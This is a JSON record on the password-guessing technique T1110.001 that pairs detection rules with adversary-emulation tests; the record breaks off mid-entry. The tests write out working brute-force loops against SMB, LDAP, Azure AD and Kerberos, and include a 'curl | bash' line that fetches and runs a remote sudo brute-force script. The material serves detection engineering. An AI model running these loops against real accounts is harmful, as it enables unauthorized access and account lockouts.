{
    "id": "T1110.001",
    "name": "Password Guessing",
    "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "platforms": "Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers",
    "kill_chain_phases": "Credential Access",
    "data_sources": "User Account: User Account Authentication, Application Log: Application Log Content",
    "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
    "url": "https://attack.mitre.org/techniques/T1110/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1110.001",
                "atomic_attack_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700",
                "atomic_attack_name": "SUDO Brute Force - Debian",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Sudo OR Su Execution",
                        "rule_link": "https://research.splunk.com/endpoint/4b00f134-6d6a-11ec-a90c-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1110.001",
                "atomic_attack_guid": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5",
                "atomic_attack_name": "ESXi - Brute Force Until Account Lockout",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Tunneling Tool Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
                        "remote_content": "title: Tunneling Tool Execution\nid: c75309a3-59f8-4a8d-9c2c-4c927ad50555\nstatus: test\ndescription: Detects the execution of well known tools that can be abused for data exfiltration and tunneling.\nauthor: Daniil Yugoslavskiy, oscd.community\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\ndate: 2019-10-24\nmodified: 2024-01-18\ntags:\n    - attack.exfiltration\n    - attack.command-and-control\n    - attack.t1041\n    - attack.t1572\n    - attack.t1071.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\httptunnel.exe'\n            - '\\plink.exe'\n            - '\\socat.exe'\n            - '\\stunnel.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administrators using one of these tools\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows Protocol Tunneling with Plink",
                        "rule_link": "https://research.splunk.com/endpoint/8aac5e1e-0fab-4437-af0b-c6e60af23eed/"
                    }
                ]
            },
            {
                "tech_id": "T1110.001",
                "atomic_attack_guid": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4",
                "atomic_attack_name": "Password Brute User using Kerbrute Tool",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Use Short Name Path in Command Line",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                    "1883444f-084b-419b-ac62-e0d0c5b3693f",
                    "71886b70-d7b4-4dbf-acce-87d2ca135262",
                    "aaafa146-074c-11eb-adc1-0242ac120002"
                ],
                "lookup_results": [
                    {
                        "uuid": "09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                        "lookup_data": {
                            "capec": "CAPEC-49",
                            "mitre-attack-id": "T1110.001",
                            "mitre-cti:description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                            "mitre-cti:name": "Password Guessing",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers', 'Network'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Microsoft Threat Intelligence Center (MSTIC)', 'Mohamed Kmal'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119', 'created': '2020-02-11T18:38:22.617Z', 'x_mitre_version': '1.3', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1110.001', 'url': 'https://attack.mitre.org/techniques/T1110/001'}, {'source_name': 'Trend Micro Emotet 2020', 'url': 'https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi', 'description': 'Cybercrime & Digital Threat Team. (2020, February 13). Emotet Now Spreads via Wi-Fi. Retrieved February 16, 2022.'}, {'source_name': 'Cylance Cleaver', 'url': 'https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf', 'description': 'Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.'}, {'source_name': 'US-CERT TA18-068A 2018', 'url': 'https://www.us-cert.gov/ncas/alerts/TA18-086A', 'description': 'US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.'}, {'url': 'https://capec.mitre.org/data/definitions/49.html', 'source_name': 'capec', 'external_id': 'CAPEC-49'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target\\'s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\\n\\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\\'s login failure policies. (Citation: Cylance Cleaver)\\n\\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n* SNMP (161/UDP and 162/TCP/UDP)\\n\\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.', 'modified': '2022-07-22T18:37:22.173Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Password Guessing', 'x_mitre_detection': 'Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['User Account: User Account Authentication', 'Application Log: Application Log Content'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1883444f-084b-419b-ac62-e0d0c5b3693f",
                        "lookup_data": {
                            "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.\nWithout knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\n",
                            "raw": "author: frack113\ndate: 2021/12/27\ndescription: 'Adversaries with no prior knowledge of legitimate credentials within\n  the system or environment may guess passwords to attempt access to accounts.\n\n  Without knowledge of the password for an account, an adversary may opt to systematically\n  guess the password using a repetitive or iterative mechanism\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - System.DirectoryServices.Protocols.LdapDirectoryIdentifier\n    - System.Net.NetworkCredential\n    - System.DirectoryServices.Protocols.LdapConnection\nfalsepositives:\n- Unknown\nid: 1883444f-084b-419b-ac62-e0d0c5b3693f\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.001/T1110.001.md#atomic-test-2---brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-ntlm-or-kerberos\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1110.001\ntitle: Suspicious Connection to Remote Account\n",
                            "sigma:id": "1883444f-084b-419b-ac62-e0d0c5b3693f",
                            "title": "Suspicious Connection to Remote Account",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "71886b70-d7b4-4dbf-acce-87d2ca135262",
                        "lookup_data": {
                            "description": "Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in Windows Spooler Service",
                            "raw": "author: Florian Roth (Nextron Systems), KevTheHermit, fuzzyf10w\ndate: 2021/06/30\ndescription: Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in\n  Windows Spooler Service\ndetection:\n  condition: selection\n  selection:\n    EventID: 31017\n    ServerName|startswith: \\1\n    UserName: ''\nfalsepositives:\n- Account fallback reasons (after failed login with specific account)\nfields:\n- Computer\n- User\nid: 71886b70-d7b4-4dbf-acce-87d2ca135262\nlevel: medium\nlogsource:\n  product: windows\n  service: smbclient-security\nmodified: 2023/01/02\nreferences:\n- https://twitter.com/KevTheHermit/status/1410203844064301056\n- https://github.com/hhlxf/PrintNightmare\n- https://github.com/afwu/PrintNightmare\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1110.001\ntitle: Suspicious Rejected SMB Guest Logon From IP\n",
                            "sigma:id": "71886b70-d7b4-4dbf-acce-87d2ca135262",
                            "title": "Suspicious Rejected SMB Guest Logon From IP",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aaafa146-074c-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects command line parameters used by Hydra password guessing hack tool",
                            "raw": "author: Vasiliy Burov\ndate: 2020/10/05\ndescription: Detects command line parameters used by Hydra password guessing hack\n  tool\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains|all:\n    - '-u '\n    - '-p '\n  selection2:\n    CommandLine|contains:\n    - ^USER^\n    - ^PASS^\nfalsepositives:\n- Software that uses the caret encased keywords PASS and USER in its command line\nid: aaafa146-074c-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/vanhauser-thc/thc-hydra\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1110\n- attack.t1110.001\ntitle: Hydra Password Guessing Hack Tool\n",
                            "sigma:id": "aaafa146-074c-11eb-adc1-0242ac120002",
                            "title": "Hydra Password Guessing Hack Tool",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1110.001",
                "display_name": "Brute Force: Password Guessing",
                "atomic_tests": [
                    {
                        "name": "Brute Force Credentials of single Active Directory domain users via SMB",
                        "auto_generated_guid": "09480053-2f98-4854-be6e-71ae5f672224",
                        "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "user": {
                                "description": "Account to bruteforce",
                                "type": "string",
                                "default": "%username%"
                            }
                        },
                        "executor": {
                            "name": "command_prompt",
                            "command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n"
                        }
                    },
                    {
                        "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
                        "auto_generated_guid": "c2969434-672b-4ec8-8df0-bbb91f40e250",
                        "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "user": {
                                "description": "Account to bruteforce",
                                "type": "string",
                                "default": "$ENV:USERNAME"
                            },
                            "passwords_path": {
                                "description": "List of passwords we will attempt to brute force with",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1110.001\\src\\passwords.txt"
                            },
                            "domain": {
                                "description": "Active Directory domain FQDN",
                                "type": "string",
                                "default": "$env:UserDnsDomain"
                            },
                            "auth": {
                                "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
                                "type": "string",
                                "default": "NTLM"
                            }
                        },
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n"
                        }
                    },
                    {
                        "name": "Brute Force Credentials of single Azure AD user",
                        "auto_generated_guid": "5a51ef57-299e-4d62-8e11-2d440df55e69",
                        "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
                        "supported_platforms": [
                            "azure-ad"
                        ],
                        "input_arguments": {
                            "username": {
                                "description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"",
                                "type": "string",
                                "default": "bruce.wayne@contoso.com"
                            },
                            "passwords": {
                                "description": "List of passwords we will attempt to brute force with",
                                "type": "string",
                                "default": "Password1`n1q2w3e4r`nPassword!"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AzureAD module must be installed.\n",
                                "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
                                "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n"
                        }
                    },
                    {
                        "name": "Password Brute User using Kerbrute Tool",
                        "auto_generated_guid": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4",
                        "description": "Bruteforce a single user's password from a wordlist\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "domaincontroller": {
                                "description": "Domain controller where test will be run",
                                "type": "string",
                                "default": "$ENV:userdnsdomain"
                            },
                            "domain": {
                                "description": "Domain where you will be testing",
                                "type": "string",
                                "default": "$ENV:userdomain"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
                            },
                            {
                                "description": "bruteuser.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n"
                        }
                    },
                    {
                        "name": "SUDO Brute Force - Debian",
                        "auto_generated_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700",
                        "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "url of remote payload",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "Check if running on a Debian based machine.\n",
                                "prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
                                "get_prereq_command": "apt update && apt install -y openssl sudo curl\n"
                            }
                        ],
                        "executor": {
                            "name": "bash",
                            "elevation_required": true,
                            "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \"cd /tmp; curl -s #{remote_url} | bash\" art\n",
                            "cleanup_command": "userdel -fr art\n"
                        }
                    },
                    {
                        "name": "SUDO Brute Force - Redhat",
                        "auto_generated_guid": "4097bc00-5eeb-4d56-aaf9-287d60351d95",
                        "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "url of remote payload",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "Check if running on a Redhat based machine.\n",
                                "prereq_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
                                "get_prereq_command": "yum update && yum install -y openssl sudo curl\n"
                            }
                        ],
                        "executor": {
                            "name": "bash",
                            "elevation_required": true,
                            "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
                            "cleanup_command": "userdel -fr art\n"
                        }
                    },
                    {
                        "name": "SUDO Brute Force - FreeBSD",
                        "auto_generated_guid": "abcde488-e083-4ee7-bc85-a5684edd7541",
                        "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "url of remote payload",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Check if running on a FreeBSD based machine.\n",
                                "prereq_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
                                "get_prereq_command": "pkg update && pkg install -y sudo curl bash\n"
                            }
                        ],
                        "executor": {
                            "name": "bash",
                            "elevation_required": true,
                            "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
                            "cleanup_command": "rmuser -y art\n"
                        }
                    },
                    {
                        "name": "ESXi - Brute Force Until Account Lockout",
                        "auto_generated_guid": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5",
                        "description": "An adversary may attempt to brute force the password of privilleged account for privilege escalation.\nIn the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "vm_host": {
                                "description": "Specify the host name of the ESXi Server",
                                "type": "string",
                                "default": "atomic.local"
                            },
                            "plink_file": {
                                "description": "Path to Putty",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
                            },
                            "lockout_threshold": {
                                "description": "Specify the account lockout threshold configured on the ESXI management server",
                                "type": "string",
                                "default": "5"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "The plink executable must be found in the ExternalPayloads folder.\n",
                                "prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
                            }
                        ],
                        "executor": {
